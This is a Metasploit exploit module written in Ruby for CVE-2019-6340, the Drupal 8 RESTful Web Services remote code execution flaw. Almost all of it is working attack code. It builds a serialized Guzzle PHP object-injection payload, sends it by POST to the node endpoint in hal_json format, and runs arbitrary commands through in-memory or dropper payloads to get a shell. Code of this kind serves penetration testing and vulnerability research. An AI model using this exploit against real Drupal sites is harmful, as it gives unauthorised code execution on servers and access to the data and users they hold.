##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  # At the moment only targeting node's rest endpoint and hal_json format
  Rank = NormalRanking

  include Msf::Exploit::Remote::HTTP::Drupal

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal SA-CORE-2019-003 RestWS Remote PHP Code Execution',
      'Description'    => %q{
        This module exploits a Drupal RESTful Web Services RCE.

        Drupal < 8.5.11, and < 8.6.10 are vulnerable.
      },
      'Author'         => [
        'Samuel Mortenson', # Vulnerability discovery
        'Charles Fol',      # Proof of concept (Drupal 8.x)
        'Rotem Reiss',      # Metasploit module
        'wvu'               # Author of the drupal_drupalgeddon2 Metasploit module which was used as the base for this module
      ],
      'References'     => [
        ['CVE', '2019-6340'],
        ['URL', 'https://www.drupal.org/sa-core-2019-003'],
        ['URL', 'https://www.ambionics.io/blog/drupal8-rce']
      ],
      'DisclosureDate' => '2019-02-20',
      'License'        => MSF_LICENSE,
      'Platform'       => ['php', 'unix', 'linux'],
      'Arch'           => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],
      'Privileged'     => false,
      'Payload'        => {'BadChars' => '&>\''},
      'Targets'        => [
        #
        # Automatic targets (PHP, cmd/unix, native)
        #
        ['Automatic (PHP In-Memory)',
          'Platform'   => 'php',
          'Arch'       => ARCH_PHP,
          'Type'       => :php_memory
        ],
        ['Automatic (PHP Dropper)',
          'Platform'   => 'php',
          'Arch'       => ARCH_PHP,
          'Type'       => :php_dropper
        ],
        ['Automatic (Unix In-Memory)',
          'Platform'   => 'unix',
          'Arch'       => ARCH_CMD,
          'Type'       => :unix_memory
        ],
        ['Automatic (Linux Dropper)',
          'Platform'   => 'linux',
          'Arch'       => [ARCH_X86, ARCH_X64],
          'Type'       => :linux_dropper
        ],
        #
        # Drupal 8.x targets (PHP, cmd/unix, native)
        #
        ['Drupal 8.x (PHP In-Memory)',
          'Platform'   => 'php',
          'Arch'       => ARCH_PHP,
          'Version'    => Gem::Version.new('8'),
          'Type'       => :php_memory
        ],
        ['Drupal 8.x (PHP Dropper)',
          'Platform'   => 'php',
          'Arch'       => ARCH_PHP,
          'Version'    => Gem::Version.new('8'),
          'Type'       => :php_dropper
        ],
        ['Drupal 8.x (Unix In-Memory)',
          'Platform'   => 'unix',
          'Arch'       => ARCH_CMD,
          'Version'    => Gem::Version.new('8'),
          'Type'       => :unix_memory
        ],
        ['Drupal 8.x (Linux Dropper)',
          'Platform'   => 'linux',
          'Arch'       => [ARCH_X86, ARCH_X64],
          'Version'    => Gem::Version.new('8'),
          'Type'       => :linux_dropper
        ]
      ],
      'DefaultTarget'  => 0, # Automatic (PHP In-Memory)
      'Notes'          => {'AKA' => ['SA-CORE-2019-003', 'CVE-2019-6340']}
    ))

    register_options([
      OptBool.new('DUMP_OUTPUT', [false, 'Dump HTTP response body', false])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
      OptString.new('WritableDir', [true, 'Writable dir for droppers', '/tmp'])
    ])
  end

  def check
    checkcode = CheckCode::Safe

    @version = target['Version'] || drupal_version

    if @version && @version.to_s =~ /^8\b/
      print_status("Drupal #{@version} targeted at #{full_uri}")
      checkcode = CheckCode::Detected
    elsif @version && @version.to_s =~ /^7\b/
      print_error('Drupal 7 is not supported by this module')
      return CheckCode::Unknown
    else
      print_error('Could not determine Drupal version to target')
      return CheckCode::Unknown
    end

    # Generate random string to validate if the RCE worked
    token = Rex::Text.rand_text_alphanumeric(8..42)
    res = execute_command("printf #{token}")

    if res && res.body.end_with?(token)
      checkcode = CheckCode::Vulnerable
    end

    checkcode
  end

  def exploit
    if check == CheckCode::Safe && datastore['ForceExploit'] == false
      fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
    end

    unless @version
      print_warning('Targeting Drupal 8.x')
      @version = Gem::Version.new('8')
    end

    if datastore['PAYLOAD'] == 'cmd/unix/generic'
      print_warning('Enabling DUMP_OUTPUT for cmd/unix/generic')
      # XXX: Naughty datastore modification
      datastore['DUMP_OUTPUT'] = true
    end

    # Try to get shell
    execute_command(payload.encoded)

    sleep(2)
    return if session_created?

    # XXX: This will spawn a *very* obvious process
    execute_command("php -r '#{payload.encoded}'")
  end

  def execute_command(cmd)
    print_status "Executing the command: #{cmd}"
    res = exploit_drupal8(cmd)

    # Define "common errors" and their meaning
    common_errors = {
      422  => "Exploit failed, in case that VHOST was not defined, consider to set that option",
      406 => "Exploit failed with 'No route found for the specified format hal_json..' - you can manually test other endpoints and / or formats"
    }

    if res
      if common_errors[res.code]
        print_error common_errors[res.code]
        return
      end

      # Handle any other codes (403 is what we see on successful exploitation)
      if res.code != 403
        print_error("Unexpected reply: #{res.inspect}")
        return
      end

      if datastore['DUMP_OUTPUT']
        print_line(res.body)
      end
    end

    res
  end

  def exploit_drupal8(cmd)
    # Clean URLs are enabled by default and "can't" be disabled
    uri = normalize_uri(target_uri.path, 'node')

    # @todo Support other formats ?
    vars_get = {'_format' => 'hal_json'}

    # Get the command length for the payload
    cmd_len = cmd.length.to_s

    data = {
      "link" => [{
        "value" => "link",
        # The payload was generated using PHPGGC: `./phpggc guzzle/rce1 system id --json`
        # @see https://www.ambionics.io/blog/drupal8-rce
        "options" => "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:#{cmd_len}:\"#{cmd}\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
      }],
      "_links" => {
        "type" => {
          "href" => "#{full_uri(vhost_uri: true)}rest/type/shortcut/default"
        }
      }
    }

    send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'ctype' => 'application/hal+json',
      'vars_get'  => vars_get,
      'data' => data.to_json
    )
  end
end
